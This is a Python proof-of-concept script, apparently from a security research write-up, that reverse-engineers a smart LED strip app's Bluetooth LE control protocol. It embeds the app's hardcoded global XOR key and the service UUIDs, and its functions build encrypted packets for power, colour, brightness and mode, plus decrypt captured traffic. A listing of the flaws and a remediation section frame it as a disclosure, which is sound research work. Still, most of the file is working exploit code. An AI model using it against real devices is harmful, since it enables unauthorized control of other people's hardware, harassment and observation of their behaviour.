#!/usr/bin/env python3
"""
LED Strips Security PoC - Unauthorized Control Demonstration
============================================================

This script demonstrates the security vulnerabilities in Smart LED application
by replicating device control functionality without the original app.

CRITICAL VULNERABILITIES EXPLOITED:
1. Hardcoded XOR encryption key
2. No authentication mechanism
3. Predictable command structure
4. No replay protection

Author: Security Research Team
Date: November 2025
Purpose: Educational/Security Research

DISCLAIMER: For authorized testing on personally owned hardware only.
"""

import struct
import time
from typing import List, Optional

# ====================================================================================
# CRITICAL FINDING: Hardcoded XOR Encryption Key
# ====================================================================================
# Extracted from com.easylink.colorful.utils.EncryptUtil
XOR_KEY = bytes([89, 76, 90, 75, 53, 49, 33, 41, 62, 72, 64, 118, 
                 100, 98, 81, 68, 94, 68, 63])

# BLE Configuration (extracted from BluetoothLEService.java)
BLE_SERVICE_UUID = "0000fff0-0000-1000-8000-00805f9b34fb"
BLE_CHARACTERISTIC_UUID = "0000fff3-0000-1000-8000-00805f9b34fb"
MANUFACTURER_ID = 48872  # 0xBEE8


class XORCipher:
    """
    VULNERABILITY: Simple XOR cipher instead of proper encryption (AES/ChaCha20)
    
    This implementation replicates the insecure encryption found in:
    com.easylink.colorful.utils.EncryptUtil.encode()
    """
    
    def __init__(self, data_num: int = 0):
        """
        Args:
            data_num: Counter value (0-255) appended to XOR key
        """
        self.key = XOR_KEY + bytes([data_num])
        
    def encrypt(self, data: bytes, start: int = 1, end: int = 24) -> bytes:
        """
        Apply XOR encryption to data bytes.
        
        SECURITY ISSUE: XOR encryption is easily broken through:
        - Known plaintext attacks
        - Frequency analysis
        - Pattern analysis
        
        Args:
            data: Data to encrypt
            start: Start index for encryption
            end: End index for encryption
            
        Returns:
            Encrypted data
        """
        result = bytearray(data)
        
        for i in range(start, min(end + 1, len(result))):
            for key_byte in self.key:
                result[i] ^= key_byte
                
        return bytes(result)
    
    def decrypt(self, data: bytes, start: int = 1, end: int = 24) -> bytes:
        """
        Decrypt XOR-encrypted data (XOR is symmetric).
        """
        return self.encrypt(data, start, end)  # XOR decryption = encryption


class LEDStripController:
    """
    Proof of Concept: Control LED strips without official app
    
    VULNERABILITIES EXPLOITED:
    1. No device authentication
    2. Hardcoded encryption key
    3. Predictable command structure
    4. No session management
    """
    
    # Command constants (extracted from BluetoothLEService.java)
    CMD_PREFIX = 0x7E  # 126 - All commands start with this
    CMD_SUFFIX = 0xEF  # 239 - All commands end with this
    
    # Command opcodes
    CMD_BRIGHTNESS = 0x04
    CMD_CHANGE_COLOR = 0x07
    CMD_CHANGE_MODE = 0x05
    CMD_LIGHT_ON = 0x04
    
    def __init__(self, device_address: str):
        """
        Args:
            device_address: BLE MAC address of target device
        """
        self.device_address = device_address
        self.data_counter = 0
        
    def _build_command(self, *args) -> bytes:
        """
        Build command packet with proper structure.
        
        Format: [PREFIX, length, opcode, ...params, SUFFIX]
        """
        cmd = bytearray([self.CMD_PREFIX])
        cmd.extend(args)
        cmd.append(self.CMD_SUFFIX)
        return bytes(cmd)
    
    def _encrypt_command(self, command: bytes) -> bytes:
        """
        Encrypt command using hardcoded XOR key.
        
        VULNERABILITY: Same key used for all devices globally
        """
        cipher = XORCipher(self.data_counter)
        encrypted = cipher.encrypt(command)
        
        # Increment counter (wraps at 256)
        self.data_counter = (self.data_counter + 1) % 256
        
        return encrypted
    
    def set_brightness(self, brightness: int, light_mode: int = 255) -> bytes:
        """
        Change LED brightness.
        
        Args:
            brightness: Brightness level (0-100)
            light_mode: Light mode (default 255 = current mode)
            
        Returns:
            Encrypted command packet
        """
        command = self._build_command(
            self.CMD_BRIGHTNESS,
            0x01,
            brightness & 0xFF,
            light_mode & 0xFF,
            0xFF, 0xFF, 0x00
        )
        return self._encrypt_command(command)
    
    def set_color(self, red: int, green: int, blue: int) -> bytes:
        """
        Change LED color (RGB).
        
        SECURITY ISSUE: No authorization check
        
        Args:
            red: Red component (0-255)
            green: Green component (0-255)
            blue: Blue component (0-255)
            
        Returns:
            Encrypted command packet
        """
        command = self._build_command(
            self.CMD_CHANGE_COLOR,
            0x05,
            0x03,
            red & 0xFF,
            green & 0xFF,
            blue & 0xFF,
            0x10
        )
        return self._encrypt_command(command)
    
    def set_mode(self, mode: int) -> bytes:
        """
        Change LED animation mode.
        
        Args:
            mode: Mode number (0-255, mode + 128 for internal encoding)
            
        Returns:
            Encrypted command packet
        """
        command = self._build_command(
            self.CMD_CHANGE_MODE,
            0x03,
            (mode + 128) & 0xFF,
            0x03,
            0xFF, 0xFF, 0x00
        )
        return self._encrypt_command(command)
    
    def power_on_off(self, state: bool) -> bytes:
        """
        Turn LEDs on or off.
        
        Args:
            state: True = On, False = Off
            
        Returns:
            Encrypted command packet
        """
        command = self._build_command(
            self.CMD_LIGHT_ON,
            0x04,
            0x01 if state else 0x00,
            0x00,
            0x01 if state else 0x00,
            0xFF, 0x00
        )
        return self._encrypt_command(command)


def demonstrate_vulnerabilities():
    """
    Demonstrate security vulnerabilities through practical examples.
    """
    print("=" * 70)
    print("LED STRIPS SECURITY VULNERABILITY DEMONSTRATION")
    print("=" * 70)
    print()
    
    # Demo device address (replace with actual target)
    device_address = "XX:XX:XX:XX:XX:XX"
    
    controller = LEDStripController(device_address)
    
    print("🔓 Vulnerability 1: No Authentication Required")
    print("   -> Any device can connect without pairing/PIN")
    print()
    
    print("🔓 Vulnerability 2: Hardcoded XOR Key")
    print(f"   -> Key: {XOR_KEY.hex()}")
    print("   -> Same key for ALL devices globally")
    print()
    
    print("🔓 Vulnerability 3: Predictable Commands")
    print("   -> All commands start with 0x7E, end with 0xEF")
    print("   -> Easy to reverse engineer")
    print()
    
    print("📦 Example Commands (Encrypted):")
    print("-" * 70)
    
    # Generate example commands
    examples = [
        ("Power On", controller.power_on_off(True)),
        ("Set Red Color", controller.set_color(255, 0, 0)),
        ("Set Green Color", controller.set_color(0, 255, 0)),
        ("Set Brightness 50%", controller.set_brightness(50)),
        ("Set Mode 1", controller.set_mode(1)),
    ]
    
    for name, encrypted_cmd in examples:
        print(f"{name:20s}: {encrypted_cmd.hex()}")
    
    print()
    print("⚠️  IMPACT:")
    print("   • Unauthorized device control from 10m range")
    print("   • No user notification/consent required")
    print("   • Privacy violation (observe user behavior)")
    print("   • Potential for harassment/pranks")
    print()
    print("💡 REMEDIATION:")
    print("   1. Implement proper BLE pairing/bonding")
    print("   2. Use AES-128 (minimum) encryption")
    print("   3. Add device-specific keys (not global)")
    print("   4. Implement replay protection (nonces/timestamps)")
    print("   5. Add user confirmation for connections")
    print()


def decrypt_captured_packet(hex_data: str, data_num: int = 0):
    """
    Decrypt a captured BLE packet.
    
    This demonstrates how captured traffic can be easily decrypted
    using the hardcoded key.
    
    Args:
        hex_data: Hex string of encrypted packet
        data_num: Counter value used during encryption
    """
    encrypted = bytes.fromhex(hex_data)
    cipher = XORCipher(data_num)
    decrypted = cipher.decrypt(encrypted)
    
    print(f"Encrypted: {encrypted.hex()}")
    print(f"Decrypted: {decrypted.hex()}")
    print(f"ASCII:     {' '.join(f'{b:02x}' if b < 32 or b > 126 else chr(b) for b in decrypted)}")
    
    return decrypted


if __name__ == "__main__":
    # Run vulnerability demonstration
    demonstrate_vulnerabilities()
    
    print("=" * 70)
    print("DISCLAIMER:")
    print("This PoC is for authorized security testing on personally owned")
    print("hardware only. Unauthorized access to devices is illegal.")
    print("=" * 70)
